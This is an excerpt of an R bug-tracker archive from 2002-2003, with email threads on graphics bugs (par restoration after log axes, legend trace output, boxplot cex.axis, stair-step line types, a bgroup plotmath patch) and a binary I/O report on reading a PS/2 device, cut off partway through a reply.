> will be fixed -- and hope to close this as a bug report.

Martin,

My apologies, as I may have missed this in my first reading of your
reply, but I wanted to be sure that it was clear that there are two
separate bugs here. The first, which I found this morning in the process
of tracking down Jari's issue and the second which Jari observed in his
initial post, which started this thread yesterday.

Bug 1. The documentation in par.Rd needs to be corrected in that
par("xlog") and par("ylog") are not R.O. I presume that this is what you
are referring to above.


Bug 2. The improper restoration of par("usr") from saved values after
using log scaled axes. This is a result of the sequence of the code in
the par.c Specify() function (ie. par("usr") being set before
par("xlog") and par("ylog") are being set back to FALSE).

Possible solutions:

A. The code in par.c needs to be changed (possibly as I suggested
earlier) to enable the proper restoration of par("usr") after log scaled
axes are used

OR

B. If this is not possible due to causing other problems, par.Rd needs
to have a warning note added to inform users that par("usr") will not be
properly restored after log scales are used and that a possible solution
would be to explicitly set par(xlog = FALSE) and par(ylog = FALSE)
before restoring 'par' from saved values.  This solution of course falls
short if a function using this approach exits prematurely. One could
include code in the on.exit() function to reset 'xlog' and 'ylog' before
restoring 'par'. For example, using Jari's initial function plot2.log():

plot2.log <- function(x=1:2,y=1:2) 
{
  op <- par(no.readonly = TRUE)

  exit.restore <- function()
  {
    par(xlog =FALSE)
    par(ylog = FALSE)
    par(op)
  }

  on.exit(exit.restore())

  plot(x, y, log = "y")
}


Again, my apologies if I am mis-reading the section from your reply
above.

Regards,

Marc Schwartz


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2578 *
Subject: "trace" argument in legend()
From: jerome@hivnet.ubc.ca
Date: Mon, 24 Feb 2003 18:53:29 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2578 <==
From jerome@hivnet.ubc.ca Mon Feb 24 18:53:30 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.7/8.12.7) with ESMTP id h1OHrT35023579
	for <R-bugs@biostat.ku.dk>; Mon, 24 Feb 2003 18:53:29 +0100 (MET)
Date: Mon, 24 Feb 2003 18:53:29 +0100 (MET)
Message-Id: <200302241753.h1OHrT35023579@pubhealth.ku.dk>
From: jerome@hivnet.ubc.ca
To: R-bugs@biostat.ku.dk
Subject: "trace" argument in legend()

Full_Name: Jerome Asselin
Version: 1.6.2
OS: RedHat Linux 7.2
Submission from: (NULL) (142.103.173.179)



Should be an easy fix...

Consider the examble below:

plot(0,0)
legend(0,0,c("Hello!","Hi!"),pch=1:2,lty=1:2,trace=T)

It gives the following trace:

> plot(0,0)
> legend(0,0,c("Hello!","Hi!"),pch=1:2,lty=1:2,trace=T)
  xchar= 0.05178 ; (yextra,ychar)= 0 0.07941
  rect2(0,0, w=0.3474, h=0.2382...)
  segments2(0.015540.01554,-0.07941-0.1588, dx=0.1036, dy=0, ...)
  points2( 0.06732 0.06732 , -0.07941 -0.1588 , pch= 1 2 ...)

On the line starting by "segment2", the coordinates are not separated
by a space like on the line starting by "points2".

My recommendation is to remove the option `sep = ""' in this part of
code in legend().

[...]
        if (trace)
            catn("  segments2(", xt[ok.l] + x.off * xchar, ",",
                yt[ok.l], ", dx=", seg.len * xchar, ", dy=0, ...)",
                sep = "")
[...]

Sincerely,
Jerome Asselin


==> 2578.reply.1 <==
From maechler@stat.math.ethz.ch Tue Feb 25 10:21:32 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.7/8.12.7) with ESMTP id h1P9LW35027153
	for <R-bugs@biostat.ku.dk>; Tue, 25 Feb 2003 10:21:32 +0100 (MET)
Received: from lynne.ethz.ch (IDENT:root@lynne [129.132.58.30])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id h1P9KhGF008168;
	Tue, 25 Feb 2003 10:20:43 +0100 (MET)
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id h1P9KhM29485;
	Tue, 25 Feb 2003 10:20:43 +0100
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15963.13674.922243.390379@gargle.gargle.HOWL>
Date: Tue, 25 Feb 2003 10:20:42 +0100
To: jerome@hivnet.ubc.ca
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] "trace" argument in legend() (PR#2578)
In-Reply-To: <200302241753.h1OHrU35023583@pubhealth.ku.dk>
References: <200302241753.h1OHrU35023583@pubhealth.ku.dk>
X-Mailer: VM 7.07 under Emacs 21.2.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)

>>>>> "Jerome" == Jerome Asselin <jerome@hivnet.ubc.ca>
>>>>>     on Mon, 24 Feb 2003 18:53:30 +0100 (MET) writes:

	  ....

    Jerome> Should be an easy fix...

    Jerome> Consider the examble below:

    Jerome> plot(0,0)
    Jerome> legend(0,0,c("Hello!","Hi!"),pch=1:2,lty=1:2,trace=T)

    Jerome> It gives the following trace:

    >> plot(0,0)
    >> legend(0,0,c("Hello!","Hi!"),pch=1:2,lty=1:2,trace=T)
      > xchar= 0.05178 ; (yextra,ychar)= 0 0.07941
      > rect2(0,0, w=0.3474, h=0.2382...)
      > segments2(0.015540.01554,-0.07941-0.1588, dx=0.1036, dy=0, ...)
      > points2( 0.06732 0.06732 , -0.07941 -0.1588 , pch= 1 2 ...)

    Jerome> On the line starting by "segment2", the coordinates
    Jerome> are not separated by a space like on the line
    Jerome> starting by "points2".

    Jerome> My recommendation is to remove the option `sep = ""'
    Jerome> in this part of code in legend().

    Jerome> [...]
    Jerome> if (trace)
    Jerome> catn("  segments2(", xt[ok.l] + x.off * xchar, ",",
    Jerome> yt[ok.l], ", dx=", seg.len * xchar, ", dy=0, ...)",
    Jerome> sep = "")
    Jerome> [...]

Thank you, Jerome.
Yes, it's a buglet and your suggestion is fine.

Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
Seminar fuer Statistik, ETH-Zentrum  LEO C16	Leonhardstr. 27
ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
phone: x-41-1-632-3408		fax: ...-1228			<><

==> 2578.audit <==
Wed Feb 26 06:41:05 2003	ripley	moved from incoming to Graphics

==> 2578.followup.1 <==
From jerome@hivnet.ubc.ca Thu Feb 27 19:56:28 2003
Received: from hivnet.ubc.ca (hivnet.ubc.ca [142.103.173.1])
	by pubhealth.ku.dk (8.12.7/8.12.7) with ESMTP id h1RIuR35026604
	for <R-bugs@biostat.ku.dk>; Thu, 27 Feb 2003 19:56:28 +0100 (MET)
Received: from there (jeromePC [142.103.173.179])
	by hivnet.ubc.ca (8.9.0/8.9.0) with SMTP id LAA17721;
	Thu, 27 Feb 2003 11:00:07 -0800 (PST)
Message-Id: <200302271900.LAA17721@hivnet.ubc.ca>
Content-Type: text/plain;
  charset="iso-8859-1"
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Organization: BC Centre for Excellence in HIV/AIDS
To: Martin Maechler <maechler@stat.math.ethz.ch>
Subject: Re: [Rd] "trace" argument in legend() (PR#2578)
Date: Thu, 27 Feb 2003 10:55:58 -0800
X-Mailer: KMail [version 1.3.2]
Cc: R-bugs@biostat.ku.dk
References: <200302241753.h1OHrU35023583@pubhealth.ku.dk> <15963.13674.922243.390379@gargle.gargle.HOWL>
In-Reply-To: <15963.13674.922243.390379@gargle.gargle.HOWL>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit


Oops. I forgot this one. We should also replace "...)" by ", ...)" in this 
part of the code.

[...]
        if (trace)
            catn("  points2(", x1, ",", y1, ", pch=", pch[ok],
                "...)")
[...]

Jerome

On Tuesday 25 February 2003 01:20, Martin Maechler wrote:
> >>>>> "Jerome" == Jerome Asselin <jerome@hivnet.ubc.ca>
> >>>>>     on Mon, 24 Feb 2003 18:53:30 +0100 (MET) writes:
>
> 	  ....
>
>     Jerome> Should be an easy fix...
>
>     Jerome> Consider the examble below:
>
>     Jerome> plot(0,0)
>     Jerome> legend(0,0,c("Hello!","Hi!"),pch=1:2,lty=1:2,trace=T)
>
>     Jerome> It gives the following trace:
>     >> plot(0,0)
>     >> legend(0,0,c("Hello!","Hi!"),pch=1:2,lty=1:2,trace=T)
>     >>
>       > xchar= 0.05178 ; (yextra,ychar)= 0 0.07941
>       > rect2(0,0, w=0.3474, h=0.2382...)
>       > segments2(0.015540.01554,-0.07941-0.1588, dx=0.1036, dy=0, ...)
>       > points2( 0.06732 0.06732 , -0.07941 -0.1588 , pch= 1 2 ...)
>
>     Jerome> On the line starting by "segment2", the coordinates
>     Jerome> are not separated by a space like on the line
>     Jerome> starting by "points2".
>
>     Jerome> My recommendation is to remove the option `sep = ""'
>     Jerome> in this part of code in legend().
>
>     Jerome> [...]
>     Jerome> if (trace)
>     Jerome> catn("  segments2(", xt[ok.l] + x.off * xchar, ",",
>     Jerome> yt[ok.l], ", dx=", seg.len * xchar, ", dy=0, ...)",
>     Jerome> sep = "")
>     Jerome> [...]
>
> Thank you, Jerome.
> Yes, it's a buglet and your suggestion is fine.
>
> Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
> Seminar fuer Statistik, ETH-Zentrum  LEO C16	Leonhardstr. 27
> ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
> phone: x-41-1-632-3408		fax: ...-1228			<><

-- 

Jerome Asselin (Jérôme)
Statistical Analyst
British Columbia Centre for Excellence in HIV/AIDS
St. Paul's Hospital
608 - 1081 Burrard Street
Vancouver, British Columbia
CANADA V6Z 1Y6

Email: jerome@hivnet.ubc.ca
Phone: 604 806-9112   Fax: 604 806-9044

==> 2578.followup.2 <==
From jerome@hivnet.ubc.ca Wed May 28 18:49:55 2003
Received: from hivnet.ubc.ca (hivnet.ubc.ca [142.103.173.1])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4SGns2b008506
	for <R-bugs@biostat.ku.dk>; Wed, 28 May 2003 18:49:54 +0200 (MET DST)
Received: from there (jeromePC [142.103.173.13])
	by hivnet.ubc.ca (8.9.0/8.9.0) with SMTP id JAA27626;
	Wed, 28 May 2003 09:55:14 -0700 (PDT)
Message-Id: <200305281655.JAA27626@hivnet.ubc.ca>
Content-Type: text/plain;
  charset="iso-8859-1"
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Organization: BC Centre for Excellence in HIV/AIDS
To: Martin Maechler <maechler@stat.math.ethz.ch>
Subject: Re: [Rd] "trace" argument in legend() (PR#2578)
Date: Wed, 28 May 2003 09:49:14 -0700
X-Mailer: KMail [version 1.3.2]
Cc: R-bugs@biostat.ku.dk
References: <200302241753.h1OHrU35023583@pubhealth.ku.dk> <15963.13674.922243.390379@gargle.gargle.HOWL>
In-Reply-To: <15963.13674.922243.390379@gargle.gargle.HOWL>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit


Another easy fix for legend() with trace=TRUE would be to
replace "...)" by ", ...)" in this code:
[...]
        if (trace)
            catn("  rect2(", left, ",", top, ", w=", w, ", h=",
                h, "...)", sep = "")
[...]

Cheers,
Jerome

==> 2578.reply.2 <==
From maechler@stat.math.ethz.ch Fri Jun  6 09:46:52 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h567kp2b013976
	for <R-bugs@biostat.ku.dk>; Fri, 6 Jun 2003 09:46:52 +0200 (MET DST)
Received: from lynne.ethz.ch (lynne [129.132.58.30])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h567knu9018160;
	Fri, 6 Jun 2003 09:46:49 +0200 (MEST)
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id h567kmI07079;
	Fri, 6 Jun 2003 09:46:48 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <16096.18152.679565.737497@gargle.gargle.HOWL>
Date: Fri, 6 Jun 2003 09:46:48 +0200
To: Jerome Asselin <jerome@hivnet.ubc.ca>
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] "trace" argument in legend() (PR#2578)
In-Reply-To: <200305281655.JAA27626@hivnet.ubc.ca>
References: <200302241753.h1OHrU35023583@pubhealth.ku.dk>
	<15963.13674.922243.390379@gargle.gargle.HOWL>
	<200305281655.JAA27626@hivnet.ubc.ca>
X-Mailer: VM 7.15 under Emacs 21.3.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)

>>>>> "Jerome" == Jerome Asselin <jerome@hivnet.ubc.ca>
>>>>>     on Wed, 28 May 2003 09:49:14 -0700 writes:

    Jerome> Another easy fix for legend() with trace=TRUE would be to
    Jerome> replace "...)" by ", ...)" in this code:

  [...]
	  if (trace)
	      catn("  rect2(", left, ",", top, ", w=", w, ", h=",
		  h, "...)", sep = "")
  [...]

    Jerome> Cheers,
    Jerome> Jerome

now done as well.  Thanks, Jerome. 
Martin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2628 *
Subject: cex.axis in boxplot
From: Torsten Hothorn <Torsten.Hothorn@rzmail.uni-erlangen.de>
Date: Wed, 12 Mar 2003 17:27:34 +0100 (CET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2628 <==
From mailnull@stat.math.ethz.ch Wed Mar 12 17:28:02 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2CGS1n9019153
	for <R-bugs@biostat.ku.dk>; Wed, 12 Mar 2003 17:28:01 +0100 (MET)
Received: from hypatia.math.ethz.ch (mailnull@localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.8/8.12.6) with ESMTP id h2CGRwfW022763
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Wed, 12 Mar 2003 17:27:58 +0100 (MET)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.8/8.12.6/Submit) id h2CGRwe0022762
	for R-bugs@biostat.ku.dk; Wed, 12 Mar 2003 17:27:58 +0100 (MET)
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.8/8.12.6) with ESMTP id h2CGRrfV022745
	for <r-bugs@lists.r-project.org>; Wed, 12 Mar 2003 17:27:54 +0100 (MET)
Received: from max5.rrze.uni-erlangen.de ([131.188.3.50] ident=root)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 18t957-0004nB-00
	for <r-bugs@r-project.org>; Wed, 12 Mar 2003 10:27:53 -0600
Received: from medmax.ivmed.med.uni-erlangen.de by max5.rrze.uni-erlangen.de with ESMTP for r-bugs@r-project.org; Wed, 12 Mar 2003 17:27:35 +0100
Received: from imbe68.imbe.med.uni-erlangen.de by medmax.ivmed.med.uni-erlangen.de with ESMTP for r-bugs@r-project.org; Wed, 12 Mar 2003 17:27:35 +0100
Date: Wed, 12 Mar 2003 17:27:34 +0100 (CET)
From: Torsten Hothorn <Torsten.Hothorn@rzmail.uni-erlangen.de>
X-X-Sender: hothorn@artemis.imbe.med.uni-erlangen.de
To: r-bugs@r-project.org
Subject: cex.axis in boxplot
Message-Id: <Pine.LNX.4.51.0303121726570.3228@artemis.imbe.med.uni-erlangen.de>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=0.2 required=5.0
	tests=SPAM_PHRASE_00_01,USER_AGENT_PINE
	version=2.43
X-Spam-Level: 


Hi,

the graphical parameter "cex.axis" does not have any affect for "boxplot":

data(iris)
boxplot(iris[,1:4], ylab="y", cex.lab=2, cex.axis=2)


The patch is simply adding "cex.axis" to the search for axis relevant
parameters in "bxp":

ax.pars <- pars[names(pars) %in% c("xaxt", "yaxt", "las", "cex.axis")]

Best,

Torsten


--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = Under development (unstable)
 major = 1
 minor = 7.0
 year = 2003
 month = 03
 day = 11
 language = R

Search Path:
 .GlobalEnv, package:methods, package:ctest, package:mva, package:modreg,
package:nls, package:ts, Autoloads, package:base


==> 2628.audit <==
Tue Apr 15 09:27:15 2003	maechler	foobar
Tue Apr 15 09:27:15 2003	maechler	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2630 *
Subject: plot() with type="s" and lty=2
From: jerome@hivnet.ubc.ca
Date: Wed, 12 Mar 2003 23:35:59 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2630 <==
From jerome@hivnet.ubc.ca Wed Mar 12 23:35:59 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2CMZxn9021097
	for <R-bugs@biostat.ku.dk>; Wed, 12 Mar 2003 23:35:59 +0100 (MET)
Date: Wed, 12 Mar 2003 23:35:59 +0100 (MET)
Message-Id: <200303122235.h2CMZxn9021097@pubhealth.ku.dk>
From: jerome@hivnet.ubc.ca
To: R-bugs@biostat.ku.dk
Subject: plot() with type="s" and lty=2

Full_Name: Jerome Asselin
Version: 1.6.2
OS: RedHat Linux 7.2
Submission from: (NULL) (142.103.173.179)



In the following example, the line type lty=2 does not show properly
across the entire line.

x <- c(seq(0,.5,.001),seq(.6,1,.1))
y <- rep(1,length(x))
plot(x,y,type="s",lty=2)

Sincerely,
Jerome Asselin

==> 2630.followup.1 <==
From gb@stat.umu.se Thu Mar 13 08:33:26 2003
Received: from tal.stat.umu.se (tal.stat.umu.se [130.239.56.32])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2D7XQn9023441
	for <R-bugs@biostat.ku.dk>; Thu, 13 Mar 2003 08:33:26 +0100 (MET)
Received: from tal.stat.umu.se (localhost.localdomain [127.0.0.1])
	by tal.stat.umu.se (8.12.8/8.12.8) with ESMTP id h2D7ZhJd002147;
	Thu, 13 Mar 2003 08:35:43 +0100
Received: from localhost (gb@localhost)
	by tal.stat.umu.se (8.12.8/8.12.8/Submit) with ESMTP id h2D7Zgbg002143;
	Thu, 13 Mar 2003 08:35:43 +0100
X-Authentication-Warning: tal.stat.umu.se: gb owned process doing -bs
Date: Thu, 13 Mar 2003 08:35:42 +0100 (CET)
From: =?ISO-8859-1?Q?G=C3=B6ran_Brostr=C3=B6m?= <gb@stat.umu.se>
To: jerome@hivnet.ubc.ca
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] plot() with type="s" and lty=2 (PR#2630)
In-Reply-To: <200303122236.h2CMa0n9021101@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.44.0303130830020.2139-100000@tal.stat.umu.se>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=ISO-8859-1
Content-Transfer-Encoding: 8BIT

On Wed, 12 Mar 2003 jerome@hivnet.ubc.ca wrote:

> Full_Name: Jerome Asselin
> Version: 1.6.2
> OS: RedHat Linux 7.2
> Submission from: (NULL) (142.103.173.179)
> 
> 
> 
> In the following example, the line type lty=2 does not show properly
> across the entire line.
> 
> x <- c(seq(0,.5,.001),seq(.6,1,.1))
> y <- rep(1,length(x))
> plot(x,y,type="s",lty=2)
> 
> Sincerely,
> Jerome Asselin

Right. I reported this two days ago on 'r-help' (maybe the wrong place).
In the copy of my report below you also see the (a?) solution.

Göran
-------------------------------------------------------------------
Consider the following two ways of stair steps plotting:

plo <- function(ty = 2, steps = 200){
  old.par <- par(mfrow = c(2, 1))
  x <- seq(1, 100, length = steps)
  y <- seq(1, 10, length = steps)
  plot(x, y, type = "s", lty = ty, main = "Stair steps")

  x <- rep(x, each = 2)[-1]
  y <- rep(y, each = 2)[-2*steps]
  plot(x, y, type = "l", lty = ty, main = "Line steps")
  par(old.par)
}
[...]
---------------------------------------------------------------------
---
 Göran Broström                    tel: +46 90 786 5223
 Department of Statistics          fax: +46 90 786 6614
 Umeå University                   http://www.stat.umu.se/egna/gb/
 SE-90187 Umeå, Sweden             e-mail: gb@stat.umu.se

______________________________________________
R-help@stat.math.ethz.ch mailing list
https://www.stat.math.ethz.ch/mailman/listinfo/r-help

> 
> ______________________________________________
> R-devel@stat.math.ethz.ch mailing list
> https://www.stat.math.ethz.ch/mailman/listinfo/r-devel
> 

-- 
---
 Göran Broström                    tel: +46 90 786 5223
 Department of Statistics          fax: +46 90 786 6614
 Umeå University                   http://www.stat.umu.se/egna/gb/
 SE-90187 Umeå, Sweden             e-mail: gb@stat.umu.se


==> 2630.audit <==
Fri Mar 14 19:37:16 2003	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3099 *
Subject: surprising behaviour of "bgroup": sets all in greek letters
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Date: Sun, 25 May 2003 18:33:49 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3099 <==
From ligges@amadeus.statistik.uni-dortmund.de Sun May 25 18:33:48 2003
Received: from nx5.hrz.uni-dortmund.de (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4PGXl2b004589
	for <R-bugs@biostat.ku.dk>; Sun, 25 May 2003 18:33:48 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de (Amadeus.Statistik.Uni-Dortmund.DE [129.217.206.1])
	by nx5.hrz.uni-dortmund.de (Postfix) with ESMTP
	id A67044AA715; Sun, 25 May 2003 18:33:47 +0200 (MET DST)
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.11.6+Sun/8.11.6) with ESMTP id h4PGXlv01676;
	Sun, 25 May 2003 18:33:47 +0200 (MET DST)
Message-ID: <3ED0F06D.7080701@statistik.uni-dortmund.de>
Date: Sun, 25 May 2003 18:33:49 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.3) Gecko/20030312
X-Accept-Language: en-us, en, de-de, de
MIME-Version: 1.0
To: r-bugs <R-bugs@biostat.ku.dk>
Cc: ulf.martin@gmx.net
Subject: surprising behaviour of "bgroup": sets all in greek letters
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Let me summarize the bug reported by Ulf Martin on R-help with the same 
subject line.

The code

   plot(1:10)
   text(1, 9, expression(F == bgroup("{", x, "")))

results in greek letters, which is not expected here.
That happens if the user tries to set only a left delimeter, the same with:

   text(2, 8, expression(F == bgroup("{", x, ".")))

or

   text(3, 7, expression(F == bgroup(".", x, "}")))

but it works if delimeters are specified, as in:

   text(4, 6, expression(F == bgroup("{", x, ")")))


I don't know whether I have just fixed the symptoms here (Paul ?). 
Anyway, the following fix of  .../src/main/plotmath.c  works as expected.

Uwe Ligges



==========================
(diff'ed to R-1.7.0 patched (2003-05-25))
 >  diff -u ./plotmath.old ./r-patched/src/main/plotmath.c


--- ./plotmath.old     2003-05-25 17:47:23.000000000 +0200
+++ ./r-patched/src/main/plotmath.c     2003-05-25 17:49:38.000000000 +0200
@@ -2075,10 +2075,12 @@
      delim2 = DelimCode(expr, CADDDR(expr));
      bbox = RenderElement(CADDR(expr), 0);
      dist = max(bboxHeight(bbox) - axisHeight, bboxDepth(bbox) + 
axisHeight);
-    bbox = RenderDelim(delim1, dist + extra, draw);
+    if (delim1 != '.')
+        bbox = RenderDelim(delim1, dist + extra, draw);
      bbox = CombineBBoxes(bbox, RenderElement(CADDR(expr), draw));
      bbox = RenderItalicCorr(bbox, draw);
-    bbox = CombineBBoxes(bbox, RenderDelim(delim2, dist + extra, draw));
+    if (delim2 != '.')
+        bbox = CombineBBoxes(bbox,     RenderDelim(delim2, dist + 
extra, draw));
      return bbox;
  }


==> 3099.audit <==
Thu May 29 09:40:51 2003	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  In-Out

* PR# 1688 *
Subject: Maybe a problem in binary read/write
From: accot@free.fr
Date: Tue, 18 Jun 2002 22:51:17 +0200 (MET DST)
--I don't think file() is said to work with devices!
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1688 <==
From accot@free.fr  Tue Jun 18 22:51:17 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA26479
	for <R-bugs@biostat.ku.dk>; Tue, 18 Jun 2002 22:51:17 +0200 (MET DST)
Date: Tue, 18 Jun 2002 22:51:17 +0200 (MET DST)
From: accot@free.fr
Message-Id: <200206182051.WAA26479@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Maybe a problem in binary read/write

Full_Name: Johnny Accot
Version: 1.5.1
OS: Linux
Submission from: (NULL) (198.4.83.52)


Hi.

I'm having a problem with the binary read/write functions.  I'm writing a device
driver in R (why not?) and of course I have to send a couple commands to the
device.  Typically, I send one byte, receive one acknowledgement byte, send
another byte, receive an ACK, and so on.  At least this is what I would like to
do.  Instead, after writing one byte, reading its acknowledgement byte, and
writing a second byte, R hangs on the next read for an unknown reason.  I guess
this is a bug in the read/write functions.  If you have a PS/2 device you may
try to run the following code:

ascii <- sapply(1:255, function(i)
parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
dev <- file("/dev/psaux")
open(dev, "w+b")
writeChar(ascii[246], dev, eos=NULL)
readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
writeChar(ascii[246], dev, eos=NULL)
readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
close(dev)

which gives:

> ascii <- sapply(1:255, function(i)
parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> dev <- file("/dev/psaux")
> open(dev, "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[1] 250
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[...R hangs here...]

It first creates an ascii table, opens the PS/2 device for binary read&write,
writes the byte 0xF6 (246 in decimal, which means: set default; it is harmless),
reads the acknowledgement byte 0xFA (250 in decimal), writes another 0xF6, and
then hangs when reading the second acknowledgement byte.  If, instead, you close
the device between the two writes, it's fine:

> ascii <- sapply(1:255, function(i)
parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> 
> dev <- file("/dev/psaux", "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[1] 250
> close(dev)
> 
> dev <- file("/dev/psaux", "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[1] 250
> close(dev)

This is not a feature, is it? :-)  The behavior is the same in versions 1.4.1,
1.5.0 and 1.5.1 on my computer.  I don't have to send bytes very often, so I'll
stick with the open-each-time strategy, but it is not very clean.

I also tried to write bytes using the writeBin command, but it says the "size=1"
is not available on my computer.  This is why I'm using the writeChar function.

Please let me know if I'm doing something wrong.  I hope not.

And thanks for the great software! :-)

Johnny

PS: if you try to run the code and don't get 250 as acknowledgement byte, it
means the PS/2 controller is not in idle state.  Very unlikely though.  Try
again as the set-default command should bring it back to its idle state.

==> 1688.audit <==
Wed Jun 19 11:08:36 2002	ripley	changed notes
Wed Jun 19 11:08:36 2002	ripley	foobar
Wed Jun 19 11:08:36 2002	ripley	moved from incoming to In-Out

==> 1688.followup.1 <==
From ripley@stats.ox.ac.uk  Wed Jun 19 11:15:35 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA29635
	for <R-bugs@biostat.ku.dk>; Wed, 19 Jun 2002 11:15:34 +0200 (MET DST)
Received: from auk.stats (pc1-oxfd1-4-cust16.oxf.cable.ntl.com [62.254.131.16])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA04893;
	Wed, 19 Jun 2002 10:14:51 +0100 (BST)
Date: Wed, 19 Jun 2002 10:13:45 +0100 (BST)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: ripley@auk.stats
To: accot@free.fr
cc: R-bugs@biostat.ku.dk
Subject: Re: Maybe a problem in binary read/write (PR#1688)
In-Reply-To: <200206182051.WAA26484@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.44.0206191008210.21134-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

Not a bug: check the documentation of file(), which is documented to work
for files but not for devices.  No attempt is made to cope with e.g.
blocking on non-files.

It's a pretty extreme view of the world to consider /dev/psaux to be a
file, and R is just using standard C <stdio.h> I/O.

However, this is a great opportunity for you to contribute a device()
function to R.

On Tue, 18 Jun 2002 accot@free.fr wrote:

> Full_Name: Johnny Accot
> Version: 1.5.1
> OS: Linux
> Submission from: (NULL) (198.4.83.52)
>
>
> Hi.
>
> I'm having a problem with the binary read/write functions.  I'm writing a device
